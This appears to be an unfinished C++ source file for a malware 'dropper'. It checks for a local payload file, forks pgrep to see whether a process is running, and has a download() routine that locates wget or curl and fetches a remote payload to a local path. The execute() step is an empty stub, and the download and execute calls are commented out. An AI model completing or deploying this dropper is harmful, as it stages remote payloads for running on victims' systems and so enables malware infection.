#include "dropper.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int pull()
{
	fprintf(stdout, "[Dropper called]");

	bool payloadExists = fileExists(_PayloadLocal);

	//fputs(payloadExists ? "Exists" : "Doesn't Exist", stdout);

	//if(!payloadExists)
	//  	download();

	payloadRunning();
	//fputs(payloadRunning() ? "\nIs running" : "\nIsn't running", stdout);

	//execute();

	return 0;
}

//NOTE Only checks for accessibility, not existance.
bool fileExists(std::string name)
{
	struct stat buffer;
	return (stat (name.c_str(), &buffer) == 0);
}

bool payloadRunning()
{
	// Save PID to file.
	if(fork() == 0)
	{
		int fd = open("/tmp/text.txt", O_RDWR | O_CREAT, 0666);

		dup2(fd, 1);
		dup2(fd, 2);

		close(fd);

		char* argv[] = { (char*)"pgrep", (char*)"TestProcess", (char*)0};
		execve("/usr/bin/pgrep", argv, NULL);
	}


	std::cout << "\n==========================" << std::endl;

	return false;
}

void download()
{
	std::vector<const char*> webclients = 
	{
			"/usr/bin/wget",
		   	"/usr/bin/curl"
	};


	for(size_t i = 0; i < webclients.size(); i++)
	{
		if(fileExists(webclients[i]))
		{
				std::cout << "Found webclient: " << webclients[i] << std::endl;
				
				int pid = fork();

				if(pid == 0)
					execl(webclients[i], "wget", 
										 (i == 0) ? "-q" : "-sS",
										 (i == 0) ? "-O" : "-o",
										 _PayloadLocal.c_str(), 
										 _PayloadRemote.c_str(),
										 NULL);

				break;
		}
	}
}

void execute()
{

}
